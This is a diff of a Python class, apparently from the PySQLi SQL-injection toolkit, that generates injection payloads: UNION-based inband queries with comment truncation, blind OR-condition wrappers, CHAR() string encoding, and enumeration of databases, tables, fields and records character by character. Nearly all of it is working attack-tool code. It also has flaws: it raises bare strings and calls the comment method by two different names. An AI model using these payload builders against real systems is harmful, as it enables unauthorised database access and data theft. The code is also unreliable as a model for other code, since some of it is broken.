@@ -1,48 +1,54 @@
 #-*- coding: utf-8 -*-
 
-## SQLForge allows specific SQL querys crafting.
-# This class provides a flexible way to generate DBMS compliant SQL syntax.
-#
-# The basic forge can be derivated in order to override some functions, thus patching
-# the lacks and errors it could contain for a given DBMS. Every DBMS plugin contained
-# in PySQLi derives an SQL forge from this class and overrides some methods.
-# 
-# Note that many methods MUST be overriden in order for the derivated class to work
-# properly.
-
 class SQLForge:
-    
-    ## Constructor
-    # @param context Context object providing all the required settings
-    
+
+    """
+    SQLForge
+
+    This class is in charge of providing methods to craft SQL queries. Bascially,
+    the methods already implemented fit with most of the DBMS.
+    """
+
     def __init__(self, context):
+        """ Constructor
+
+        context: context to associate the forge with.
+        """
         self.context = context
+
+    def wrap_bisec(self, sql):
+        """
+        Wrap a bisection-based query.
+
+        This method must be overriden to provide a way to use bisection given
+        a DBMS. There is no universal way to perform this, so it has to be
+        implemented in each DBMS plugin.
+        """
+        raise 'You must define the wrap_bisec() method'
+
     
-    
-    ## Wrap a string based on the current context
-    # This method wraps a string and encode it if the current context requires it
-    #
-    # @param sql String to wrap
-    # @return Wrapped (and if required encoded) string
-    
-    def wrap_string(self, sql):
+    def wrap_string(self, string):
+        """
+        Wraps a string.
+
+        This method encode the given string and/or add delimiters if required.
+        """
         if self.context.require_string_encoding():
             out = 'CHAR('
-            for car in sql:
+            for car in string:
                 out += str(ord(car))+','
             out = out[:-1] + ')'
         else:
-            return "%c%s%c" % (self.context.get_string_delimiter(),sql,self.context.get_string_delimiter())
+            return "%c%s%c" % (self.context.get_string_delimiter(),string,self.context.get_string_delimiter())
         return out
 
 
-    ## Wrap SQL query to fit in the selected injection mode
-    # This is a part of the "magic" of PySQLi, SQL injection is performed based on the current context
-    # 
-    # @param sql SQL query to wrap (prepare for injection)
-    # @return Vulnerable parameter value ready to be injected
-        
     def wrap_sql(self, sql):
+        """
+        Wraps SQL query
+
+        This method wraps an SQL query given the specified context.
+        """
         q = self.context.get_string_delimiter()
         if self.context.is_blind():
             if self.context.require_truncate():
@@ -56,21 +62,23 @@ class SQLForge:
                 elif self.context.in_int():
                     return "%s OR (%s)=%s " % (self.context.get_default_value(), sql,self.wrap_field(self.context.get_default_value()))
         else:
-            # no matter if truncate is set or not, inband injection requires truncation
-            if self.context.in_string():
-                return "%c AND 1=0 UNION %s %s" % (q, sql, self.context.getComment())
-            elif self.context.in_int():
-                return "%s AND 1=0 UNION %s %s" % (self.context.get_default_value(), sql, self.context.get_comment())
+            if self.context.require_truncate():
+                if self.context.in_string():
+                    return "%c AND 1=0 UNION %s %s" % (q, sql, self.context.getComment())
+                elif self.context.in_int():
+                    return "%s AND 1=0 UNION %s %s" % (self.context.get_default_value(), sql, self.context.get_comment())
+            else:
+                if self.context.in_string():
+                    return "%c AND 1=0 UNION %s" % (q, sql)
+                elif self.context.in_int():
+                    return "%s AND 1=0 UNION %s" % (self.context.get_default_value(), sql)
 
 
-    ## Wrap a given field
-    # Field wrapping is done by adding a leading and trailing string delimiter if the target parameter is a string,
-    # or by simply returning it if the target parameter is an integer
-    # 
-    # @param field Field to wrap
-    # @return Wrapped field
 
     def wrap_field(self,field):
+        """
+        Wrap a field with delimiters if required.
+        """
         q = self.context.get_string_delimiter()
         if self.context.in_string():
             return "%c%s%c" % (q,field,q)
@@ -78,6 +86,9 @@ class SQLForge:
             return "%s"%field
 
     def wrap_ending_field(self, field):
+        """
+        Wrap the last field with a delimiter if required.
+        """
         q = self.context.get_string_delimiter()
         if self.context.in_string():
             return "%c%s" % (q,field)
@@ -85,112 +96,76 @@ class SQLForge:
             return "%s"%field
 
 
-    ## Basic SQL string length code
-    # This method is used to generate a piece of SQL returning the number of characters of a given string
-    #
-    # @param string String to use for character count (can be SQL)
-    # @return Piece of SQL query that can be used further
-    
     def string_len(self, string):
+        """
+        Forge a piece of SQL retrieving the length of a string.
+        """
         return "LENGTH(%s)" % string
 
     
-    ## Basic SQL substring
-    # Generate a piece of SQL returning a single character of a string
-    #
-    # @param string Target string (can be SQL)
-    # @param pos Character position, starting from 0
-    # @return Piece of SQL query 
-
-    def get_char(self,string,pos):
+    def get_char(self, string, pos):
+        """
+        Forge a piece of SQL returning the n-th character of a string.
+        """
         return "SUBSTRING(%s,%d,1)" % (string,pos)
 
 
-    ## Basic SQL string concatenation
-    # Generate a piece of SQL returning the result of str1+str2
-    #
-    # @param str1 First string to concatenate
-    # @param str2 Second string to concatenate
-    # @return Piece of SQL query
-        
     def concat_str(self, str1, str2):
+        """
+        Forge a piece of SQL concatenating two strings.
+        """
         return "CONCAT(%s,%s)" % (str1, str2)
 
     
-    ## Basic SQL ascii code
-    # You got the idea ...
-    #
-    # @param char Character (can be SQL)
-    # @return SQL query returning the ascii code of the given character    
-    
     def ascii(self, char):
+        """
+        Forge a piece of SQL returning the ascii code of a character.
+        """
         return "ASCII(%s)" % char
 
 
-    ## Basic SQL count
-    # Counts the number of records returned by a subquery
-    #
-    # @param records Records to count (can be SQL)
-    # @return Piece of SQL query    
-    
     def count(self, records):
+        """
+        Forge a piece of SQL returning the number of rows from a set of records.
+        """
         sql= "(SELECT COUNT(*) FROM (%s) AS T1)" % records
         return sql
 
 
-    ## Basic SQL limit
-    # Return only the n-th record from a set of records
-    #
-    # @param records Set of records (can be SQL)
-    # @return Piece of SQL query
-
     def take(self,records, index):
+        """
+        Forge a piece of SQL returning the n-th record of a set.
+        """
         return "(%s LIMIT %d,1)" % (records, index)
 
 
-    ## Basic SELECT * SQL query
-    # Return every records of a given table from a given database
-    #
-    # @param table Target table
-    # @param db Target database
-    # @return Piece of SQL query
-
     def select_all(self, table, db):
+        """
+        Forge a piece of SQL returning all records of a given table.
+        """
         return "(SELECT * FROM %s.%s)" % (db, table)
 
 
-    ## Basic record field read
-    # Return the content of a given field from a given table for a given database
-    #
-    # @param field Field name (must be a string)
-    # @param db Target database
-    # @param table Target table
-    # @param pos Record index
-    # @return Piece of SQL query
-    
     def get_table_field_record(self, field, table, db, pos):
+        """
+        Forge a piece of SQL returning one record with one column from a table.
+        """
         return "(SELECT %s FROM (SELECT * FROM %s.%s) as t0 LIMIT %d,1)"%(field,db,table,pos)
 
 
-    ## Basic SQL condition check
-    # Create a piece of SQL query based on a given SQL condition
-    #
-    # @param val Expression to compare (can be SQL)
-    # @param cmp integer value to compare to
-    # @return Piece of SQL query
-    
     def forge_cdt(self, val, cmp):
+        """
+        Forge a piece of SQL creating a condition.
+        """
         return "(%s)<%d" % (val,cmp)
 
 
-    ## Basic inband SELECT query builder
-    # This method is only used to generate SELECT requests for inband injection, to use with
-    # the UNION operator
-    #
-    # @param sql SQL query to embed
-    # @return Piece of SQL query
-
     def forge_second_query(self, sql):
+        """
+        Basic inband query builder.
+
+        Builds the second part of an inband injection (following the UNION).
+        """
         query = 'SELECT '
         columns= []        
         fields = self.context.get_inband_fields()
@@ -206,142 +181,132 @@ class SQLForge:
         return query + ','.join(columns)
 
 
-    ## Get version string
-    # MUST be overriden
-    #
-    # @return Piece of SQL query
-
     def get_version(self):
-        raise 'You must provide the getVersion() method.'
+        """
+        Forge a piece of SQL returning the DBMS version.
 
+        Must be overriden by each DBMS plugin.
+        """
+        raise 'You must provide the get_version() method.'
 
-    ## Get username
-    # Generate a piece of SQL returning the current username
-    #
-    # @return Piece of SQL
 
     def get_user(self):
+        """
+        Forge a piece of SQL returning the current username.
+        """
         return 'username()'
 
-    ## Get current database
-    # Generate a piece of SQL returning the current database name as a string
-    #
-    # @return Piece of SQL
 
     def get_current_database(self):
+        """
+        Forge a piece of SQL returning the current database name.
+        """
         return 'database()'
 
-    ## Get all known databases (enumeration)
-    # MUST be overriden
-    #
-    # @return Piece of SQL
-            
+   
     def get_databases(self):
-        raise 'You must define the "getDatabases" function.'
+        """
+        Forge a piece of SQL returning all the known databases.
+        """
+        raise 'You must define the "get_databases" function.'
 
     def get_database(self, id):
+        """
+        Forge a piece of SQL returning the name of the id-th database.
+        """
         return self.take(self.get_databases(), id)
 
-    ## Count databases
-    # This method should not be overriden
-    #
-    # @return Piece of SQL
             
     def get_nb_databases(self):
+        """
+        Forge a piece of SQL returning the number of databases.
+        """
         return self.count(self.get_databases())
 
 
 
-    ## Get database name string
-    # This method should not be overriden
-    #
-    # @param id Database index
-    # @return Piece of SQL
-        
     def get_database_name(self, id):
+        """
+        Forge a piece of SQL returning the name of id-th database.
+        """
         return self.take(self.get_databases(),id)
 
 
-    ## Get all known tables(enumeration)
-    # MUST be overriden
-    #
-    # @param db Target database name
-    # @return Piece of SQL
-
     def get_tables(self,db):
-        raise 'You must provide the getTables() method.'
+        """
+        Forge a piece of SQL returning all the tables of the provided database (db).
 
+        db: target database name.
+        """
+        raise 'You must provide the get_tables() method.'
 
-    ## Count tables
-    # This method should not be overriden
-    #
-    # @param db Target database name
-    # @return Piece of SQL
 
     def get_nb_tables(self,db):
+        """
+        Forge a piece of SQL returning the number of tables.
+
+        db: target database name.
+        """
         return self.count(self.get_tables(db))
 
 
-    ## Get table name 
-    # This method should not be overriden
-    #
-    # @param db Target database name
-    # @param id Table id
-    # @return Piece of SQL
-        
     def get_table_name(self, id, db):
+        """
+        Forge a piece of SQL returning the name of a table.
+
+        id: table index
+        db: target database name.
+        """
         return self.take(self.get_tables(db), id)
 
 
-    ## Get all known fields (enumeration)
-    # MUST be overriden
-    #
-    # @param db Target database name
-    # @param table Target table name
-    # @return Piece of SQL
-
     def get_fields(self, table, db):
-        raise 'You must provide the getFields() method.'
+        """
+        Forge a piece of SQL returning all the existing fields of a table.
 
+        table: target table name
+        db: target database name
+        """
+        raise 'You must provide the get_fields() method.'
 
-    ## Count fields
-    # This method should not be overriden
-    #
-    # @param db Target database name
-    # @param table target table name
-    # @return Piece of SQL
 
     def get_nb_fields(self, table, db):
+        """
+        Forge a piece of SQL returning the number of fields.
+
+        table: target table name
+        db: target database name
+        """
         return self.count(self.get_fields(table,db))
 
 
-    ## Get field name 
-    # This method should not be overriden
-    #
-    # @param db Target database name
-    # @param table Target table name
-    # @param id Table id
-    # @return Piece of SQL
-        
     def get_field_name(self, table, id, db):
+        """
+        Forge a piece of SQL returning the field name
+
+        table: target table name
+        db: target database name
+        id: field index
+        """
         return self.take(self.get_fields(table, db), id)
         
-    ## Get string length
-    # This method should not be overriden
-    #    
-    # @param sql Target string (can be SQL)
-    # @return String length 
-    
+
     def get_string_len(self, sql):
+        """
+        Forge a piece of SQL returning the length of a string/subquery.
+
+        sql: source string or sql
+        """
         return self.string_len(sql)
 
 
-    ## Get string character
-    # This method should not be overriden
-    # 
-    # @param sql Target string (can be SQL)
-    # @param pos Cahracter position
-    # @return Ascii code of the given character 
-    
     def get_string_char(self, sql, pos):
+        """
+        Forge a piece of SQL returning the ascii code of a string/sql
+
+        sql: source string or sql
+        pos: character position
+        """
         return self.ascii(self.get_char(sql, pos))
+
+
